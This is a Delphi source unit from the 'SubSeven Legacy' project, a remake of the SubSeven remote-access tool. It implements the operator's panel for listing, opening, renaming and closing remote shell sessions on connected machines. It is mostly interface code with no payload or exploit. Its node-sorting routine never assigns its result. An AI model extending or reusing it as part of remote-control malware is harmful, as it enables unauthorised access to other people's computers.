{******************************************************************************}
{                                                                              }
{         ____             _     ____          _           ____                }
{        |  _ \  __ _ _ __| | __/ ___|___   __| | ___ _ __/ ___|  ___          }
{        | | | |/ _` | '__| |/ / |   / _ \ / _` |/ _ \ '__\___ \ / __|         }
{        | |_| | (_| | |  |   <| |__| (_) | (_| |  __/ |   ___) | (__          }
{        |____/ \__,_|_|  |_|\_\\____\___/ \__,_|\___|_|  |____/ \___|         }
{                                                                              }
{                           +++++++++++++++++++++                              }
{                           +       +           +                              }
{                           +       +           +                              }
{                           +    +++++++++      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++      +      +                              }
{                           +            +      +                              }
{                           +            +      +                              }
{                           +++++++++++++++++++++                              }
{                                 SubSeven Legacy                              }
{                                                                              }
{                                                                              }
{                   Author: DarkCoderSc (Jean-Pierre LESUEUR)                  }
{                   https://www.twitter.com/                                   }
{                   https://github.com/darkcodersc                             }
{                   License: Apache License 2.0                                }
{                                                                              }
{                                                                              }
{  Disclaimer:                                                                 }
{  -----------                                                                 }
{    We are doing our best to prepare the content of this app and/or code.     }
{    However, The author cannot warranty the expressions and suggestions       }
{    of the contents, as well as its accuracy. In addition, to the extent      }
{    permitted by the law, author shall not be responsible for any losses      }
{    and/or damages due to the usage of the information on our app and/or      }
{    code.                                                                     }
{                                                                              }
{    By using our app and/or code, you hereby consent to our disclaimer        }
{    and agree to its terms.                                                   }
{                                                                              }
{    Any links contained in our app may lead to external sites are provided    }
{    for convenience only.                                                     }
{    Any information or statements that appeared in these sites or app or      }
{    files are not sponsored, endorsed, or otherwise approved by the author.   }
{    For these external sites, the author cannot be held liable for the        }
{    availability of, or the content located on or through it.                 }
{    Plus, any losses or damages occurred from using these contents or the     }
{    internet generally.                                                       }
{                                                                              }
{                                                                              }
{                                                                              }
{    I dedicate this work to my daughter.                                      }
{                                                                              }
{******************************************************************************}

unit uFrameShell;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes,
  Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs, ___S7DockFrame, S7DockCaption,
  Sub7.Viewer.VCL.Button, S7Panel, VirtualTrees, Sub7.Core.Types, uFormRemoteShell,
  Sub7.Viewer.Types, Sub7.Thread.Net.Client.RemoteShell, Vcl.Menus, S7PopupMenu;

type
  TShellStatus = (
    ssActive,
    ssClosed
  );

  TTreeData = record
    Date           : TDateTime;
    SessionId      : String;
    Status         : TShellStatus;
    Form           : TFormRemoteShell;
    DestroyOnClose : Boolean;
    Name           : String;
  end;
  PTreeData = ^TTreeData;

  TFrameShell = class(TS7FrameDock)
    VST: TVirtualStringTree;
    PanelFooter: TS7Panel;
    ButtonReload: TS7Button;
    ButtonNew: TS7Button;
    PopupMenuAction: TS7PopupMenu;
    CloseSelectedSession1: TMenuItem;
    DestroySelectedSession1: TMenuItem;
    N1: TMenuItem;
    RenameSession1: TMenuItem;
    procedure ButtonNewClick(Sender: TObject);
    procedure VSTChange(Sender: TBaseVirtualTree; Node: PVirtualNode);
    procedure VSTFocusChanged(Sender: TBaseVirtualTree; Node: PVirtualNode;
      Column: TColumnIndex);
    procedure VSTGetText(Sender: TBaseVirtualTree; Node: PVirtualNode;
      Column: TColumnIndex; TextType: TVSTTextType; var CellText: string);
    procedure VSTGetNodeDataSize(Sender: TBaseVirtualTree;
      var NodeDataSize: Integer);
    procedure VSTCompareNodes(Sender: TBaseVirtualTree; Node1,
      Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
    procedure VSTFreeNode(Sender: TBaseVirtualTree; Node: PVirtualNode);
    procedure VSTColumnDblClick(Sender: TBaseVirtualTree; Column: TColumnIndex;
      Shift: TShiftState);
    procedure ButtonReloadClick(Sender: TObject);
    procedure PopupMenuActionPopup(Sender: TObject);
    procedure CloseSelectedSession1Click(Sender: TObject);
    procedure DestroySelectedSession1Click(Sender: TObject);
    procedure RenameSession1Click(Sender: TObject);
  private
    {@M}
    procedure ShowSelectedShellForm();
    function GetNodeBySessionId(const ASessionId : String) : PVirtualNode;
  protected
    FRemoteShellHandler : TSub7ClientRemoteShell;

    {@M}
    procedure DoResize(); override;
    procedure OnConnectionStateUpdated(const AConnected : Boolean); override;
  public
    {@M}
    procedure OnShellHandlerStart(const ARemoteShellHandler : TSub7ClientRemoteShell);
    procedure OnShellHandlerStop();
    procedure StopAllHandlers();
    procedure RegisterShellSession(const ASessionId : String; const ARegister : Boolean);
    procedure RenderShellOutput(const ASessionId, AData : String);

    {@C}
    constructor Create(AOwner: TComponent; const ANavMenu : TNavMenu); override;
    destructor Destroy(); override;
  end;

implementation

{$R *.dfm}

uses uFormMain, Sub7.Core.Protocol, System.StrUtils, System.DateUtils, System.Math;

procedure TFrameShell.OnConnectionStateUpdated(const AConnected : Boolean);
begin
  VST.Clear();
  ///

  ButtonNew.Enabled    := AConnected;
  ButtonReload.Enabled := False;

  if AConnected then
    FormMain.Session.CreateSessionWorker(wkTerminal);
end;

function TFrameShell.GetNodeBySessionId(const ASessionId : String) : PVirtualNode;
var ANode : PVirtualNode;
    pData : PTreeData;
begin
  result := nil;
  ///

  for ANode in VST.Nodes do begin
    pData := ANode.GetData;
    ///

    if String.Compare(pData^.SessionId, ASessionId, True) = 0 then begin
      result := ANode;

      break;
    end;
  end;
end;

procedure TFrameShell.RenameSession1Click(Sender: TObject);
var AQuery : String;
    pData  : PTreeData;
begin
  if VST.FocusedNode = nil then
    Exit();

  pData := VST.FocusedNode.GetData;

  AQuery := FormMain.MessageBox.InputQuery(FormMain, 'new name:', 'rename remote shell session');

  if AQuery = '' then
    Exit();

  VST.BeginUpdate();
  try
    pData^.Name := AQuery;

    pData^.Form.CaptionBar.Caption    := pData^.Name;
    pData^.Form.CaptionBar.SubCaption := 'remote shell';
  finally
    VST.EndUpdate();
  end;
end;

procedure TFrameShell.RenderShellOutput(const ASessionId, AData : String);
var ANode : PVirtualNode;
    pData : PTreeData;
begin
  ANode := self.GetNodeBySessionId(ASessionId);
  if not Assigned(ANode) then
    Exit();

  pData := ANode.GetData;

  if Assigned(pData^.Form) then
    pData^.Form.RenderShellOutput(AData);
end;

procedure TFrameShell.ShowSelectedShellForm();
var pData : PTreeData;
begin
  if VST.FocusedNode = nil then
    Exit();

  pData := VST.FocusedNode.GetData;

  if Assigned(pData^.Form) then
    pData^.Form.Show();
end;

procedure TFrameShell.RegisterShellSession(const ASessionId : String; const ARegister : Boolean);
var ANode : PVirtualNode;
    pData : PTreeData;
begin
  VST.BeginUpdate();
  try
    if ARegister then begin
      ANode := VST.AddChild(nil);

      pData := ANode.GetData;

      pData^.Date           := Now;
      pData^.SessionId      := ASessionId;
      pData^.Status         := ssActive;
      pData^.DestroyOnClose := False;
      pData^.Form           := TFormRemoteShell.Create(nil, ASessionId, FRemoteShellHandler);
      pData^.Name           := 'Unnamed';

      pData^.Form.SetActive(True);

      ///
      pData^.Form.Show();
    end else begin
      ANode := self.GetNodeBySessionId(ASessionId);
      if Assigned(ANode) then begin
        pData := ANode.GetData();
        ///

        if pData^.DestroyOnClose then
          VST.DeleteNode(ANode)
        else begin
          pData^.Status := ssClosed;

          pData^.Form.SetActive(False);
        end;
      end;
    end;
  finally
    VST.EndUpdate();
  end;
end;

procedure TFrameShell.VSTChange(Sender: TBaseVirtualTree; Node: PVirtualNode);
begin
  VST.Refresh();
end;

procedure TFrameShell.VSTColumnDblClick(Sender: TBaseVirtualTree;
  Column: TColumnIndex; Shift: TShiftState);
begin
  self.ShowSelectedShellForm();
end;

procedure TFrameShell.VSTCompareNodes(Sender: TBaseVirtualTree; Node1,
  Node2: PVirtualNode; Column: TColumnIndex; var Result: Integer);
var pData1 : PTreeData;
    pData2 : PTreeData;
begin
  pData1 := Node1.GetData;
  pData2 := Node2.GetData;
  ///

  case Column of
    0 : CompareText(pData1^.Name, pData2^.Name);
    1 : CompareValue(Integer(pData1^.Status), Integer(pData2^.Status));
    2 : CompareDate(pData1^.Date, pData2^.Date);
    3 : CompareText(pData1^.SessionId, pData2^.sessionId);
  end;
end;

procedure TFrameShell.VSTFocusChanged(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex);
begin
  VST.Refresh();
end;

procedure TFrameShell.VSTFreeNode(Sender: TBaseVirtualTree; Node: PVirtualNode);
var pData : PTreeData;
begin
  pData := Node.GetData;

  if Assigned(pData.Form) then
    pData.Form.Release;
end;

procedure TFrameShell.VSTGetNodeDataSize(Sender: TBaseVirtualTree;
  var NodeDataSize: Integer);
begin
  NodeDataSize := SizeOf(TTreeData);
end;

procedure TFrameShell.VSTGetText(Sender: TBaseVirtualTree; Node: PVirtualNode;
  Column: TColumnIndex; TextType: TVSTTextType; var CellText: string);
var pData : PTreeData;
begin
  pData := Node.GetData;

  case Column of
    0 : CellText := pData^.Name;

    1 : begin
      CellText := 'N/A';

      case pData^.Status of
        ssActive : CellText := 'Active';
        ssClosed : CellText := 'Closed';
      end;
    end;

    2 : CellText := DateTimeToStr(pData^.Date);

    3 : CellText := pData^.SessionId;
  end;
end;

destructor TFrameShell.Destroy();
begin

  ///
  inherited Destroy();
end;

procedure TFrameShell.DestroySelectedSession1Click(Sender: TObject);
var pData : PTreeData;
begin
  if VST.FocusedNode = nil then
    Exit();

  pData := VST.FocusedNode.GetData;

  VST.BeginUpdate();
  try
    if pData^.Status = ssClosed then begin
      VST.DeleteNode(VST.FocusedNode);
    end else begin
      pData^.DestroyOnClose := True;

      pData^.Form.CloseSession();
    end;
  finally
    VST.EndUpdate();
  end;
end;

procedure TFrameShell.ButtonReloadClick(Sender: TObject);
begin
  FormMain.Session.CreateSessionWorker(wkTerminal);
end;

procedure TFrameShell.CloseSelectedSession1Click(Sender: TObject);
var pData : PTreeData;
begin
  if VST.FocusedNode = nil then
    Exit();

  pData := VST.FocusedNode.GetData;

  pData^.Form.CloseSession();
end;

constructor TFrameShell.Create(AOwner: TComponent; const ANavMenu : TNavMenu);
begin
  inherited Create(AOwner, ANavMenu);
  ///

  FRemoteShellHandler := nil;
end;

procedure TFrameShell.OnShellHandlerStart(const ARemoteShellHandler : TSub7ClientRemoteShell);
begin
  FRemoteShellHandler := ARemoteShellHandler;
  ///

  VST.Enabled          := True;
  ButtonReload.Enabled := False;
end;

procedure TFrameShell.StopAllHandlers();
var ANode : PVirtualNode;
    pData : PTreeData;
begin
  VST.BeginUpdate();
  try
    for ANode in VST.Nodes do begin
      pData := ANode.GetData;

      pData^.Status := ssClosed;

      if Assigned(pData^.Form) then
        pData^.Form.SetActive(False);
    end;
  finally
    VST.EndUpdate();
  end;
end;

procedure TFrameShell.OnShellHandlerStop();
begin
  FRemoteShellHandler  := nil;

  ///
  VST.Enabled          := False;
  ButtonReload.Enabled := True;

  ///
  self.StopAllHandlers();
end;

procedure TFrameShell.PopupMenuActionPopup(Sender: TObject);
begin
  CloseSelectedSession1.Enabled   := VST.FocusedNode <> nil;
  DestroySelectedSession1.Enabled := CloseSelectedSession1.Enabled;
  RenameSession1.Enabled          := CloseSelectedSession1.Enabled;
end;

procedure TFrameShell.ButtonNewClick(Sender: TObject);
begin
  FRemoteShellHandler.SendCommand(rtNew);
end;

procedure TFrameShell.DoResize();
begin
  ButtonReload.Left := (PanelFooter.Width div 2) - ButtonReload.Width - 4;
  ButtonNew.Left    := (PanelFooter.Width div 2) + 4;

  ButtonReload.Top  := (PanelFooter.Height div 2) - (ButtonReload.Height div 2);
  ButtonNew.Top     := ButtonReload.Top;
end;

end.
